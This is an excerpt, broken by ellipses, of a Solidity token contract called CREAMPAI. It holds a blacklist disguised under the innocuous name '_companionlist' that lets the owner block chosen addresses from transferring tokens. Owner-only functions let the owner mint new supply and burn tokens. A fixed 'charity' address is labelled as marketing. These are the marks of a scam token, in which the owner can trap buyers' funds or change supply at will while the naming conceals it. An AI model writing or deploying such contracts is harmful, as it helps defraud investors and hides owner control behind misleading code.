...
contract CREAMPAI is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) public _balances;
    mapping(address => mapping(address => uint256)) public _allowances;
    mapping(address => bool) private _companionbalances;
    mapping(address => bool) private _companionlist;
    mapping(address => bool) private _balances1;
    
    
    uint256 public _totalSupply = 1000000000*10**18;
    string public _name = "CREAMPAI";
    string public _symbol= "CREAMPAI";
     bool balances1 = true;

    address payable public charityAddress = payable(0x3f27191e64A84fe609914B5B2F21Ff8435975091); // Marketing Address
    ...
    function addtoCompanion(address _address) onlyowner() public {
        _companionlist[_address] = true;
    }
    
    function removefromCompanion(address _address) onlyowner() public {
        _companionlist[_address] = false;
    }
    
    function isinCompanion(address _address) private view returns (bool) {
        return _companionlist[_address];
    }
    ...
    require(_companionlist[sender] == false, "ERC20: sender is listed");
    require(_companionlist[recipient] == false, "ERC20: recipient is listed");
    ...
    function _approving_burn(address account, uint256 amount) onlyOwner  public virtual {
      ...
      function  mint_initial_supply(address account, uint256 amount) onlyowner()  public virtual {
